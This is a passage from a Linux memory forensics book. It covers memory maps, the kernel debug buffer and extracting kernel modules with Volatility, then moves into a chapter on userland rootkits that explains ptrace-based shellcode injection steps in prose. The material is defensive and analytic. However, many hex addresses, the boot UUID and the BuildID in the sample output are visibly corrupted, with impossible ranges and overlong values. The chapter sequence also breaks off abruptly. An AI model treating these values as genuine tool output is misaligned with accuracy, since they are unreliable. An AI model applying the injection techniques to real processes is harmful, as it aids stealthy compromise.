Volatility Foundation Volatility Framework 2.4
reserved                                0x0                     0xFFFF
System RAM                              0x10000                 0x9EFFF
reserved                                0x9F000                 0x9FFFF
PCI Bus 0000:00                         0xA0000                 0xBFFFF
Video ROM                               0xC0000                 0xC7FFF
reserved                                0xCA000                 0xCBFFF
  Adapter ROM                           0xCA000                 0xCAFFF
PCI Bus 0000:00                         0xCC000                 0xCFFFF
PCI Bus 0000:00                         0xD0000                 0xD3FFF
PCI Bus 0000:00                         0xD4000                 0xD7FFF
PCI Bus 0000:00                         0xD8000                 0xDBFFF
reserved                                0xDC000                 0xFFFFF
  System ROM                            0xc00f000                 0xFFFFF
System RAM                              0x100000                0x3FEDFFFF
  Kernel code                           0x1000000               0x1358B25
  Kernel data                           0x1358B26               0x1694D7F
  Kernel bss                            0x1729000               0x1806FFF
ACPI Tables                             0x3FEc00e000              0x3FEFEFFF
ACPI Non-volatile Storage               0x3FEFF000              0x3FEFFFFF
System RAM                              0x3FF00000              0x3FFFFFFF
PCI Bus 0000:00                         0xC0000000              0xFEBFFFFF
  0000:00:0f.0                          0xC0000000              0xC0007FFF
  0000:00:10.0                          0xC0008000              0xC000BFFF
  0000:00:07.7                          0xC8000000              0xC8001FFF
  0000:00:10.0                          0xC8020000              0xC803FFFF
[snip]
  IOAPIC 0                              0xFEC00000              0xFEC003FF
HPET 0                                  0xFED00000              0xFED003FF
  pnp 00:08                             0xFED00000              0xFED003FF
Local APIC                              0xFEE00000              0xFEE00FFF
  reserved                              0xFEE00000              0xFEE00FFF
[snip]
```

In this output, you can see several ranges, including where RAM is mapped (“System RAM”); where the kernel’s static code, data, and bss (uninitialized variables) are mapped; as well as hardware devices such as video cards, ACPI tables, and PCI buses.

You also can see the region where the Advanced Programmable Interrupt Controller (APIC) and IOAPIC are mapped. By default, they are mapped at static physical addresses, but the operating system can change them. Computers with multicore chips use the APIC architecture to handle hardware interrupts and other actions. Malware can hook the APIC data structures to redirect control flow of interrupts to attacker-controlled handler functions. Inspecting the memory maps can help you understand where the hooks are pointing and their impact on the system. Besides the APIC, a number of other hardware devices have also been targeted by malware, such as video cards and PCI network cards. Again, when hooks are placed in these regions, the `resource` structures can provide a good indication as to what device occupies the physical address range.

---

**NOTE**

If you absolutely must capture a range of physical memory outside of system RAM, you could patch the open-source LiME acquisition tool (if, for example, you encounter malware hiding in video memory). It is highly recommended that you first acquire a memory dump without any device memory regions and then go back to collect the others. This way, if something goes wrong when acquiring video memory, at least you still have a full dump of system RAM to investigate.

In the LiME source code (the `lime.h` and `main.c` files, specifically), you see where it cycles through the memory regions and compares the name with `LIME_RAMSTR` (a string variable defined as `System RAM`).

```
#define LIME_RAMSTR "System RAM"

for (p = iomem_resource.child; p ; p = p->sibling) {
    if (strncmp(p->name, LIME_RAMSTR, sizeof(LIME_RAMSTR)))
            continue;

    // acquire the range
}
```

To capture video memory, you could either redefine `LIME_RAMSTR` as `Video ROM` (to capture only video memory) or add an additional check to the code for capturing both system memory and video memory at the same time.

---

### Verifying Acquisition Tools

As mentioned in Chapter 4, acquisition tools that interact with memory ranges reserved by devices and other hardware resources can cause memory corruption and/or system errors. By using the `linux_iomem` plugin on a memory sample, you can verify that the acquisition tool acquired the expected memory regions. To illustrate this, you will see an example of a memory sample collected with LiME, but you can also use the same approach to validate other tools that produce structured file formats.

---

**NOTE**

The use of unstructured (raw or dd-style) zero-padded memory samples is becoming less common because 64-bit systems have huge physical memory spaces (many terabytes), and raw dumps of that size are impractical and wasteful.

---

The following output shows how you can use the `limeinfo` plugin to print the memory ranges that LiME captures:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime limeinfo
Volatility Foundation Volatility Framework 2.4
Memory Start       Memory End         Size
------------------ ------------------ ------------------
0x0000000000010000 0x000000000009efff 0x000000000008f000
0x0000000000100000 0x000000003fedffff 0x000000003fdc00e000
0x000000003ff00000 0x000000003fffffff 0x0000000000100000
```

You see three ranges, and you are given the starting address, ending address, and size of each range. The next command shows how to use the `linux_iomem` plugin and filter the output to display only system RAM regions:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime 
    linux_iomem | grep "System RAM"
Volatility Foundation Volatility Framework 2.4
Resource Name          Start Address           End Address
System RAM             0x10000                 0x9EFFF
System RAM             0x100000                0x3FEDFFFF
System RAM             0x3FF00000              0x3FFFFFFF
```

If you compare the starting and ending addresses with the `limeinfo` output, you see they are same. This indicates that LiME collected the appropriate system RAM ranges. If extra ranges were collected, or if any system RAM ranges are missing, this would indicate that the tool might not have operated safely and accurately. The two main causes of this behavior are improper tool design and malicious interference. If you determine that the tool was not designed correctly (for example, a bug or miscalculation that causes it to omit ranges), you should consider no longer using the tool. On the other hand, if ranges were skipped due to malware manipulating the memory range structures, you can leverage those details to locate the “hidden” data.

## Virtual Memory Maps

Linux reserves a number of areas in the virtual address space for storing specific data types. Similar to Windows, Linux sets a boundary between user and kernel memory. For example, on 32-bit systems, userland is the lower 3GB, and kernel mode is the upper 1GB. This means that the kernel mapping starts at `0xC0000000` and goes until the end of memory at `0xFFFFFFFF`. On 64-bit systems, the kernel starts at `0xFFFFFFFF80000000`. This split is illustrated in [Figure 23-1](#figure23-1), along with some of the labels you can apply to regions in kernel memory.

![c23f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c23/c23f001.png)

*[**Figure 23-1:**](#figureanchor23-1) Layout of Linux virtual memory*

As shown in the diagram, the beginning of the kernel address space starts with the mapping of the kernel, which includes the kernel’s executable code (`.text`), read/write data (`.data`), and uninitialized variables (`.bss`). You can find each of these segments in memory based on their corresponding symbols. For example, the text segment goes from `_text` to `_etext`, the data segment goes from `_sdata` to `_edata`, and the bss segment goes from `__bss_start` to `__bss_end`. The exact addresses are denoted in the linker script, but not computed until compile time, so they vary between systems. However, they’re populated within the `System.map` file, so you can always find them for a particular machine after you’ve built the profile.

You can see how the code segment symbols are used in the following code for Volatility:

```
1 def is_kernel_text(addr_space, addr):
2
3    profile = addr_space.obj_vm
4
5    text_start = profile.get_symbol("_text")
6    text_end = profile.get_symbol("_etext")
7
8    return (addr_space.address_compare(addr, text_start) != -1 \
9            and addr_space.address_compare(addr, text_end) == -1)
```

The `is_kernel_text` function can be called by plugins that want to determine whether an address is within the code segment of the kernel. As you will see in Chapter 26, certain functions, such as those that implement system calls, are located within the kernel’s code segment on a clean system, but are often overwritten and pointed elsewhere by malware. For example, the `linux_check_syscall` plugin walks each system call handler and uses similar logic as the `is_kernel_text` function to determine whether a handler is in a trusted region (assuming that the `vmlinux` file hasn’t been infected on disk or in memory).

[Figure 23-1](#figure23-1) shows the `vmalloc` area, which is used to store large, virtually contiguous regions, such as kernel modules, video card buffers, and swapped pages. The `System.map` file stores pointers to the start and end of the `vmalloc` area, which are `VMALLOC_START` and `VMALLOC_END`, respectively. You can also see the `module_addr_min` and `module_addr_max` variables stored within the data section of the kernel. These variables identify the memory range inside the `vmalloc` region that stores all loaded kernel modules. Thus, you can use them to find hidden modules (by scanning all memory within the range).

After the `vmalloc` area are the mappings of pages from high memory that the kernel needs to access. This reserved range is limited in size and stores mappings that need to exist for only a short period. This range can be located by resolving the `PKMAP_BASE` symbol. Finally, at the end of the address space are the fixed mappings of non-identity-mapped addresses. If you recall from the “Kernel Identity Paging” section of Chapter 20, the kernel maps some pages of memory in a way that easily converts physical addresses to virtual ones (and vice versa) by adding or subtracting a fixed offset value. Other pages, such as those reserved by hardware devices, depend on where the hardware is eventually mapped into physical memory. Once the system is running, you find these mappings in the region labeled “Fixed mappings” (the `FIXADDR_START` symbol) in [Figure 23-1](#figure23-1).

## Kernel Debug Buffer

When drivers and kernel components write log messages, they store the messages within the kernel’s debug ring buffer inside of kernel memory. On a default Linux install, all users can read this buffer by typing the `dmesg` command. Some distributions lock this information down to the `root` account because it contains information that can be used in local privilege escalation exploits, as well as sensitive information belonging to users and/or hardware devices. One of the factors that determine what type of data you find in the log is whether the target system is a server or client (desktop/laptop). However, either way, there should be plenty of information kept within the debug buffers that can help you with forensics, incident response, and malware analysis.

---

## **Analysis Objectives**

Your objectives are these:

- **Recover USB serial numbers**: The debug buffer contains details (serial numbers, drive names, and so on) about removable media devices that were recently inserted into the computer. This can help you pair a physical device, such as a USB or Firewire drive, with the machine that read or wrote to the device.
- **Examine Network activity**: You commonly find traces of network devices entering promiscuous mode in the debug buffer. Additionally, you may be able to identify interactions with wireless network connections, remote network shares, and file transfers.
- **Build timelines of events**: Besides the content of debug messages, each entry in the buffer also includes a timestamp that indicates when the entry was logged. You can use this in conjunction with timelines from disk and memory.

## **Data Structures**

Since the 3.5.x kernel releases, Linux keeps track of messages within the buffer through a series of `log` structures. Kernels before this version stored the buffer as a simple character array. Here’s an example of how the `log` structure appears:

```
>>> dt("log")
'log' (16 bytes)
0x0   : ts_nsec                   ['unsigned long long']
0x8   : len                       ['unsigned short']
0xa   : text_len                  ['unsigned short']
0xc   : dict_len                  ['unsigned short']
0xe   : facility                  ['unsigned char']
0xf   : flags                     ['BitField', {'end_bit': 5, 'start_bit': 0}]
0xf   : level                     ['BitField', {'end_bit': 8, 'start_bit': 5}]
```

## **Key Points**

The key points are these:

- `ts_nsec`: The timestamp showing when the debug message was logged. The time kept is the number of nanoseconds since the machine booted.
- `text_len:` The length of the text portion of the log.
- `len:` The length of the text portion plus the header information.
- `level`: This member dictates the severity of the message, such as informational or error conditions.

---

The `linux_dmesg` plugin can recover the kernel debug buffer. For all kernel versions, the recovery process starts by locating the addresses of the `log_buf` and `log_buf_len` variables. As previously mentioned, because the format of the data depends on the kernel version, the plugin either prints the character array (before 3.5) or enumerates the `log` structures (3.5 and later).

The following shows the partial output of `linux_dmesg` for our Debian sample:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_dmesg
<6>[    0.000000] Initializing cgroup subsys cpu
<5>[    0.000000] Linux version 3.2.0-4-amd64 (debian-kernel@lists.debian.org) 
(gcc version 4.6.3 (Debian 4.6.3-14) ) #1 SMP Debian 3.2.51-1
<6>[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64 
root=UUID=b2385703-e550-4736-a19f-c84e090e5a570e ro quiet
<6>[    0.000000] Disabled fast string operations
<6>[    0.000000] BIOS-provided physical RAM map:
<6>[    0.000000]  BIOS-e820: 0000000000000000 - 000000000009f000 (usable)
<6>[    0.000000]  BIOS-e820: 000000000009f000 - 00000000000a0000 (reserved)
<6>[    0.000000]  BIOS-e820: 00000000000ca000 - 00000000000cc000 (reserved)
<6>[    0.000000]  BIOS-e820: 00000000000dc000 - 0000000000100000 (reserved)
<6>[    0.000000]  BIOS-e820: 0000000000100000 - 000000003fec00e000 (usable)
<6>[    0.000000]  BIOS-e820: 000000003fec00e000 - 000000003feff000 (ACPI data)
<6>[    0.000000]  BIOS-e820: 000000003feff000 - 000000003ff00000 (ACPI NVS)
<6>[    0.000000]  BIOS-e820: 000000003ff00000 - 0000000040000000 (usable)
<6>[    0.000000]  BIOS-e820: 00000000e0000000 - 00000000f0000000 (reserved)
<6>[    0.000000]  BIOS-e820: 00000000fec00000 - 00000000fec10000 (reserved)
<6>[    0.000000]  BIOS-e820: 00000000fee00000 - 00000000fee01000 (reserved)
<6>[    0.000000]  BIOS-e820: 00000000fffc00e000 - 0000000100000000 (reserved)
<6>[    0.000000] NX (Execute Disable) protection: active
[snip]
<6>[    0.000000] found SMP MP-table at [ffff8800000f6bf0] f6bf0
<7>[    0.000000] initial memory mapped : 0 - 20000000
<7>[    0.000000] Base memory trampoline at [ffff88000009a000] 9a000 size 20480
<6>[    0.000000] init_memory_mapping: 0000000000000000-0000000040000000
<7>[    0.000000]  0000000000 - 0040000000 page 2M
<7>[    0.000000] kernel direct mapping tables up to 40000000@1fffe000-20000000
<6>[    0.000000] RAMDISK: 36c72000 - 37631000
<4>[    0.000000] ACPI: RSDP 00000000000f6b80 00024 (v02 PTLTD )
<4>[    0.000000] ACPI: XSDT 000000003feed65e 0005C (v01 INTEL  440BX    
<4>[    0.000000] ACPI: FACP 000000003fefee98 000F4 (v04 INTEL  440BX    
<4>[    0.000000] ACPI: DSDT 000000003feee366 10B32 (v01 PTLTD  Custom   
<4>[    0.000000] ACPI: FACS 000000003fefffc0 00040
[snip]
<5>[    3.227662] sd 0:0:0:0: [sda] 41943040 512-byte logical blocks: 
<5>[    3.227724] sd 0:0:0:0: [sda] Write Protect is off
<7>[    3.227726] sd 0:0:0:0: [sda] Mode Sense: 61 00 00 00
<5>[    3.227839] sd 0:0:0:0: [sda] Cache data unavailable
<3>[    3.227840] sd 0:0:0:0: [sda] Assuming drive cache: write through
<5>[    3.229167] sd 0:0:0:0: [sda] Cache data unavailable
<3>[    3.229169] sd 0:0:0:0: [sda] Assuming drive cache: write through
<6>[    3.265076]  sda: sda1 sda2 < sda5 >
<5>[    3.265942] sd 0:0:0:0: [sda] Cache data unavailable
<3>[    3.265944] sd 0:0:0:0: [sda] Assuming drive cache: write through
<5>[    3.266367] sd 0:0:0:0: [sda] Attached SCSI disk
<6>[    3.627793] EXT4-fs (sda1): mounted filesystem with ordered data mode. 
<6>[   13.204927] Adding 901116k swap on /dev/sda5.  Priority:-1 extents:1 
```

In this output, you can see information related to the physical memory mappings of the machine, hardware configuration information, and the main hard drive being initialized. Besides local hard drives, information can also be recorded about removable media and network share access:

```
<6> [ 40.621932] CIFS VFS: cifs_mount failed w/return code = -13
```

This line shows `cifs_mount` failing with code -13, which means that the credentials given were incorrect. `cifs` is a file system driver used to access SMB network shares from Linux, and you can use these error codes to determine a user’s network share activity. The following shows output from another memory sample in which a USB thumb drive was used:

```
<6> [  143.110316] usb 4-4: new SuperSpeed USB device number 4 using xhci_hcd
<6> [  143.126899] usb 4-4: New USB device found, idVendor=125f, idProduct=312b
<6> [  143.126908] usb 4-4: New USB device strings: Mfr=1, 
Product=2, SerialNumber=3
<6> [  143.126913] usb 4-4: Product: ADATA USB Flash Drive
<6> [  143.126916] usb 4-4: Manufacturer: ADATA
<6> [  143.126920] usb 4-4: SerialNumber: 23719051000100F8
```

In this output, you can see the serial number, make, model, and other identifying characteristics. You also have the timestamp associated with the device being introduced to the computer.

When connecting to wireless networks, information about the connections is recorded as well:

```
<6> [   55.947702] wlan0: authenticate with 00:24:9d:c8:a5:42
<6> [   55.957212] wlan0: send auth to 00:24:9d:c8:a5:42 (try 1/3)
<6> [   55.962997] wlan0: authenticated
<6> [   55.963319] iwlwifi 0000:04:00.0 wlan0: disabling HT as WMM/QoS is 
not supported by the AP
<6> [   55.963328] iwlwifi 0000:04:00.0 wlan0: disabling VHT as WMM/QoS is 
not supported by the AP
<6> [   55.964447] wlan0: associate with 00:24:9d:c8:a5:42 (try 1/3)
<6> [   55.966767] wlan0: RX AssocResp from 00:24:9d:c8:a5:42 
(capab=0x411 status=0 aid=5)
<6> [   55.970763] wlan0: associated
```

In this output, you can see that the computer authenticated to a wireless router with a MAC address of `00:24:9d:c8:a5:42`. If you encounter a computer with many failed wireless authentication attempts, you can look for other artifacts of the person trying to illegally access wireless networks.

## Loaded Kernel Modules

Loadable kernel modules (LKMs) enable code to be dynamically inserted into the running operating system. Kernel modules are ELF files and are normally stored with a `.ko` extension. They can contain hardware drivers, file system implementations, security extensions, and more. The kernel module facility is also often abused by kernel-level rootkits to take control of the operating system. In this section, you learn how to locate and extract kernel modules. Later in the book, you will see a number of malicious LKMs that hook a variety of operating system data structures.

---

## **Analysis Objectives**

Your objectives are these:

- **Locate kernel modules in memory**: Before you can analyze a kernel module, you must be able to find it. Linux keeps a linked list of loaded kernels used by commands such as `lsmod` to enumerate active modules on a computer. You will learn how to locate and parse this list inside a memory sample.
- **Extract kernel modules to perform malware analysis**: Besides simply finding the structures associated with a kernel module in memory, Volatility also provides the ability to extract kernel modules to disk. These extracted kernel modules can then be loaded into reverse engineering tools, scanned with antivirus signatures, or used to generate Yara rules.

## **Data Structures**

The `module` structure is used to represent a loaded kernel module in memory. This is how it appears for a 64-bit Debian sample:

```
>>> dt("module")
'module' (584 bytes)
0x0   : state                          ['Enumeration', 
                           {'target': 'int', 'choices': 
                           {0: 'MODULE_STATE_LIVE', 1: 'MODULE_STATE_COMING', 
                            2: 'MODULE_STATE_GOING'}}]
0x8   : list                           ['list_head']
0x18  : name                           ['String', {'length': 60}]
0x50  : mkobj                          ['module_kobject']
0xa8  : modinfo_attrs                  ['pointer', ['module_attribute']]
[snip]
0xe0  : kp                             ['pointer', ['kernel_param']]
0xe8  : num_kp                         ['unsigned int']
[snip]
0x148 : init                           ['pointer', ['void']]
0x150 : module_init                    ['pointer', ['void']]
0x158 : module_core                    ['pointer', ['void']]
0x160 : init_size                      ['unsigned int']
0x164 : core_size                      ['unsigned int']
0x168 : init_text_size                 ['unsigned int']
0x16c : core_text_size                 ['unsigned int']
0x170 : init_ro_size                   ['unsigned int']
0x174 : core_ro_size                   ['unsigned int']
[snip]
0x198 : symtab                         ['pointer', ['elf64_sym']]
0x1a0 : core_symtab                    ['pointer', ['elf64_sym']]
0x1a8 : num_symtab                     ['unsigned int']
0x1ac : core_num_syms                  ['unsigned int']
0x1b0 : strtab                         ['pointer', ['char']]
0x1b8 : core_strtab                    ['pointer', ['char']]
0x1c0 : sect_attrs                     ['pointer', ['module_sect_attrs']]
0x1c8 : notes_attrs                    ['pointer', ['module_notes_attrs']]
0x1d0 : args                           ['pointer', ['char']]
[snip]
```

## **Key Points**

The key points are these:

- `list`: A pointer into the linked list of loaded kernel modules.
- `name`: The name of the kernel module. This is simply the filename of the kernel module without its extension (that is, not the full path to it on disk).
- `kp`: A pointer to the parameters passed to the module at load time.
- `num_kp`: The number of parameters.
- `module_init` and `init_size`: A pointer to and size of the module’s initialized code.
- `module_core` and `core_size`: A pointer to and size of the module’s code that is used after initialization and until the module is unloaded.
- `sect_attrs`: An array into the module’s ELF sections. Volatility uses this to reconstruct the ELF file from memory.

---

### Enumerating LKMs

The `linux_lsmod` plugin enumerates kernel modules by walking the global list stored within the `modules` variable. For each module, it then prints out the name and size, similar to the way `lsmod` lists module information on a live machine. The following shows a partial output of `linux_lsmod` against our Debian memory sample:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsmod 
Volatility Foundation Volatility Framework 2.4
lime 17991
nfsd 216170
nfs 308313
nfs_acl 12511
auth_rpcgss 37143
fscache 36739
lockd 67306
sunrpc 173730
loop 22641
coretemp 12898
crc32c_intel 12747
snd_ens1371 23250
snd_ac97_codec 106942
snd_rawmidi 23060
snd_seq_device 13176
[snip]
```

In the output, you can see the operating system uses a number of kernel modules. If you want to determine the arguments passed to a particular module at load, you can run `linux_lsmod` with the `-P/--params` flag set. If you focus this on the output related to the `lime` module, you see the following:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsmod -P
Volatility Foundation Volatility Framework 2.4
lime 17991
        format=lime
        dio=Y
        path=debian.lime
[snip]
```

If you remember from Chapter 19, the parameters given to the module were `format=lime path=debian.lime`. You can see both of those parameters reflected in the output as well as the default `Y` choice for LiME’s `dio` parameter. Many modules, including rootkits, accept command-line parameters for options such as filename prefixes to hide, configuration files, output directories, and so on. Thus, being able to recover this information can be very valuable to your investigation.

### Extracting Kernel Modules

When you find a malicious rootkit, you often want to extract it for further analysis. The `linux_moddump` plugin is capable of extracting the memory resident sections of a module and creating an ELF file that contains them. Unfortunately, after initially loading the LKM, the kernel discards the ELF header. Furthermore, it stores only minimal information about the sections and subsequently patches the symbol table with runtime data. So the `linux_moddump` plugin must work backward and find the section headers first to re-create an ELF header that resembles the original. It must then populate section attributes and fix the mangled symbol table entries.

---

**NOTE**

For more information about the ELF file format and what occurs when these files are loaded into memory, see Chapter 20.

---

The following output shows you how to use the `linux_lsmod` plugin with the `-S/--sections` option. The sections of the module are populated from the `sect_attrs` member of the structure:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsmod -S
Volatility Foundation Volatility Framework 2.4
lime 17991
        .note.gnu.build-id             0xffffffffa0392000
        .text                          0xffffffffa0391000
        .rodata                        0xffffffffa0392024
        .rodata.str1.1                 0xffffffffa0392034
        __param                        0xffffffffa0392058
        .data                          0xffffffffa0393000
        .gnu.linkonce.this_module      0xffffffffa0393010
        .bss                           0xffffffffa0393260
        .symtab                        0xffffffffa0030000
        .strtab                        0xffffffffa00303c0
[snip]
```

The output shows the sections of the module loaded into memory and the address at which they are loaded. `linux_moddump` uses this information to find each section header to rebuild the section table. It also uses the address of where the section is stored in memory to recover the raw section contents. Unfortunately, this information is not complete, so the plugin must fill in some of the fields with padding. For example, the kernel does not maintain the section alignment after loading a module; but from testing a variety of systems, it appears that sections within the same pages are contiguously mapped.

The following output shows you how to use the `linux_moddump` plugin to dump the LiME kernel module. The `-r/--regex` option is used to tell the plugin to dump modules with `lime` in the name. The `–D/--dump` option specifies the output directory:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime 
    linux_moddump -D dump -r lime
Wrote 16707 bytes to lime.0xffffffffa0391000.lkm
```

Now you can use the `file` utility to verify that you have acquired a valid ELF file. At this point, you can also run any tools that analyze ELF files, such as `readelf`. Examples of these commands are shown here:

```
$ file dump/lime.0xffffffffa0391000.lkm
dump/lime.0xffffffffa0391000.lkm: ELF 64-bit LSB relocatable, x86-64,
version 1 (SYSV), BuildID[sha1]=0xb123de5e1638741a7c58f007fd7ae9d341bd0201bf, 
not stripped

$ readelf -s dump/lime.0xffffffffa0391000.lkm
Symbol table '.symtab' contains 40 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
    <snip>
    13: 0000000000000000   318 FUNC    GLOBAL DEFAULT    2 setup_tcp
    14: ffffffff810f8c3c     0 NOTYPE  GLOBAL DEFAULT  UND filp_open
    15: ffffffff810fa6a3     0 NOTYPE  GLOBAL DEFAULT  UND vfs_write
    16: 0000000000000028     8 OBJECT  GLOBAL DEFAULT    8 path
    17: 0000000000000000   584 OBJECT  GLOBAL DEFAULT    7 __this_module
    18: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    6 dio
    19: 0000000000000208   187 FUNC    GLOBAL DEFAULT    2 setup_disk
    20: 0000000000000628     1 FUNC    GLOBAL DEFAULT    2 cleanup_module
    21: 000000000000038b   669 FUNC    GLOBAL DEFAULT    2 init_module
    22: 0000000000000304   113 FUNC    GLOBAL DEFAULT    2 write_vaddr_disk
    23: ffffffff81046a3d     0 NOTYPE  GLOBAL DEFAULT  UND __stack_chk_fail
    24: 0000000000000195   113 FUNC    GLOBAL DEFAULT    2 write_vaddr_tcp
    25: ffffffff811b001c     0 NOTYPE  GLOBAL DEFAULT  UND strncmp
    26: fffffffc81f034dee5     0 NOTYPE  GLOBAL DEFAULT  UND _cond_resched
    27: 000000000000013e    87 FUNC    GLOBAL DEFAULT    2 cleanup_tcp
    28: fffffffc81f027ed10     0 NOTYPE  GLOBAL DEFAULT  UND sock_sendmsg
    29: ffffffff811b2a37     0 NOTYPE  GLOBAL DEFAULT  UND sscanf
    30: fffffffc81f061caf0     0 NOTYPE  GLOBAL DEFAULT  UND param_ops_charp
    <snip>
```

Additionally, the LKM is created in a manner that allows for IDA Pro and other reversing tools to correctly analyze the file, as shown in [Figure 23-2](#figure23-2).

![c23f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c23/c23f002.png)

*[**Figure 23-2:**](#figureanchor23-2) Loading the extracted LKM into IDA Pro*

In Chapter 26 you learn how to find and analyze kernel rootkits. Part of this process is using `linux_moddump` to recover malicious LKMs to determine their effects on the system.

---

**NOTE**

You might be wondering why you should go through the process of extracting the module from memory when you can often find a copy on disk. The answer is that the version loaded in memory contains very useful information populated only at runtime. Examples often include the list of process IDs that the rootkit is hiding, hidden directories, and network ports and IP addresses used for backdoor communication and command and control. Analyzing only the disk version of the malware would miss this crucial information. In other cases, you may not have a full forensic disk image, so recovering the file from disk isn’t even an option.

---

## Summary

Because the kernel plays such an important role in the security and overall functionality of the system, you can frequently find valuable evidence in kernel memory. Understanding the layout of physical and virtual memory gives you the capability to associate addresses with specific hardware devices, loaded kernel modules, and so on. The kernel debug buffer provides information that can help you determine if (and when) removable media was inserted into a computer and which wireless networks a system joined. These details can help you identify how users exfiltrated data and what sites they physically visited with the computer system. You can also list and extract loaded kernel modules, which is a major step in malware analysis and rootkit investigations, as you will see in the upcoming chapters.
# Chapter 24 File Systems in Memory

As files are opened, created, read, and written, the operating system caches information about these actions in a number of data structures. The associated artifacts include the directory structure, metadata (including timestamps), and even the contents of recently accessed files. Particularly on Linux, in which memory-only file systems are used on nearly every distribution, such artifacts are lost when the machine is powered down. Thus, in many cases, preserving RAM is the best (and sometimes the only) method to determine which files an attacker accesses, where a rootkit hides, or what was introduced as the result of a client-side browser attack.

## Mounted File Systems

Linux maintains a list of the actively mounted file systems in kernel memory. One of the most basic analysis tasks is to locate this list and get an initial impression of which file systems were accessible. The direction of your investigation can be affected based on whether a file was opened from the local hard disk, over a remote Network File System (NFS) or Server Message Block (SMB) drive, or an external USB stick.

## **Analysis Objectives**

Your objectives are these:

- **Identify reconnaissance and snooping:** Many companies have internal file servers hosting intellectual property. Any semicompetent attacker will immediately try to find and mount interesting network shares, to either grab specific files or search for any files containing certain terms relevant to the attacker’s motives. ...
# Chapter 25  
 Userland Rootkits

When adversaries design rootkits, one of the first decisions that they must make is whether the rootkit will operate in userland (process memory) or kernel mode. Kernel mode rootkits offer the most power, such as Direct Kernel Object Manipulation (DKOM) capabilities, direct interaction with hardware devices, and the capability to perform certain privileged operations. However, many common rootkit tasks such as hiding processes, logging keystrokes, and snooping on network activity can all be accomplished in userland. Furthermore, userland rootkits are more portable, whereas the kernel mode counterparts are difficult to maintain due to the rapidly changing Linux kernel. Another issue is that a number of system administration tools and Host Intrusion Prevention Systems (HIPS) perform kernel mode rootkit detection. On the other hand, userland rootkit detection has so far received only minor attention, which gives the attacker greater freedom over what techniques can be used and might prolong their access to the target system.

In previous chapters, you learned how to classify userland process activity based on network sockets and connections, open files handles, and user/group contexts. The techniques discussed in this chapter are used solely for malicious purposes, and are used to intercept and modify data as well as frustrate the efforts of investigators through anti-forensics. Specifically, you will see the wide range of capabilities that userland rootkits can implement on an infected system, such as function hooking, global offset table/procedure linkage table (GOT/PLT) overwriting, shellcode and library injection, and process hollowing. You will also be taken through a number of analysis techniques and Volatility plugins that can automatically detect a large variety of these userland rootkit methods.

---

## **Analysis Objectives**

Your objectives are these:

- **Detect shellcode injection**: Attackers can inject shellcode (raw assembly instructions) into processes to modify control flow, and manipulate and intercept data. You will learn how to identify process memory that contains these injected sections.
- **Find shared library injection**: Shared library injection allows loading full ELF binaries into a target process. This method is convenient for attackers from a development perspective (they can write their code in C or C++ instead of assembly), but it leaves more traces in memory than simple shellcode injection.
- **Analyze GOT/PLT overwriting**: As the runtime addresses of symbols are resolved, they are stored within entries of the process GOT. By overwriting these pointers, malware can effectively hook function calls in a very simple and standard manner.
- **Trace inline function hooks**: Inline hooks overwrite code within a legitimate function so that control is transferred to a malicious function staged in memory by the malware. This hooking allows the malware to add, modify, and delete any data processed or returned by the hooked function.

---

---

**NOTE**

If you are not familiar with the ELF file format, we strongly recommend reading the relevant sections of Chapter 20 before continuing. They provide prerequisite knowledge for the attack techniques and Volatility plugins described in this chapter.

---

## Shellcode Injection

A block of shellcode is binary data that contains CPU instructions that serve a specific purpose such as spawning a shell (for example, `/bin/bash`), creating a network socket for backdoor access, and/or downloading additional shellcode or executables. Attackers often inject shellcode into legitimate processes as a means of stealth. To write shellcode into a target process and have it executed, the following steps must be performed. Over the next few pages, we’ll cover each step in detail.

1. An open handle must be obtained to the target process.
2. A memory region within the target process that is both writable and executable must be found or allocated.
3. The shellcode must then be written to the previously discovered region.
4. The target process or thread must be forced to execute the given shellcode.

### Step 1: Attaching to a Process with PTrace

To obtain a handle to the target process, attackers leverage Linux’s debugging API (`ptrace`). `ptrace` allows a process with sufficient privileges to have full control over another process, including read/write access to its memory and the ability to set thread execution contexts. The API is exposed through the `ptrace` function whose first argument is the action to perform, second argument is the target process ID, and third argument is the address in the process to act upon. The final argument depends on the action being performed. Here are the relevant actions for performing code injection:

- `PTRACE_ATTACH`: Attaches to the target process and pauses it. This action returns a handle to the target process if successful, which completes the first step in the injection procedure.
- `PTRACE_PEEKTEXT`: Reads data from the address space of the controlled process. It is similar to the Microsoft `ReadProcessMemory` API.
- `PTRACE_POKETEXT`: Writes data into the address space of the target process. It is similar to the Microsoft `WriteProcessMemory` API.
- `PTRACE_GETREGS`: Reads the general-purpose registers from the controlled process.
- `PTRACE_SETREGS`: Sets any of the general-purpose registers of the controlled process.
- `PTRACE_CONT`: Continues a paused process.
- `PTRACE_STOP`: Stops (or pauses) a running process so that it can be examined.
- `PTRACE_DETACH`: Detaches the controlling process from the target process.

### Step 2: Finding/Allocating Memory

After malware has attached to a target process, the shellcode then needs to be transferred to the target’s address space. Malware accomplishes this by overwriting existing code in the target process or by injecting a small block of shellcode into the target process that allocates a larger memory region.

#### Overwriting Existing Code

In many cases, it is possible to find a *hole* within an executable region of memory. These holes, or unused/slack areas, exist because sections of a binary are aligned on a page boundary (typically 4,096 bytes), and the legitimate code of the application may occupy only a small portion of that size. This slack space can leave room for small- to medium-sized payloads, which is perfect because shellcode is typically quite small. Furthermore, by hijacking an already executable region of memory, attackers don’t need to worry about non-executable pages (for example, NX protection).

Another method for finding where to inject the shellcode in a target process was published by skape (see the *Uninformed Research* journal here: [http://hick.org/code/skape/papers/needle.txt](http://hick.org/code/skape/papers/needle.txt)). Instead of finding holes within executable regions, his technique overwrote the beginning of a function in the target process that executes only once, such as `main`. Thus, attackers can avoid overwriting instructions that might actually be referenced again.

#### Foreign Memory Allocation

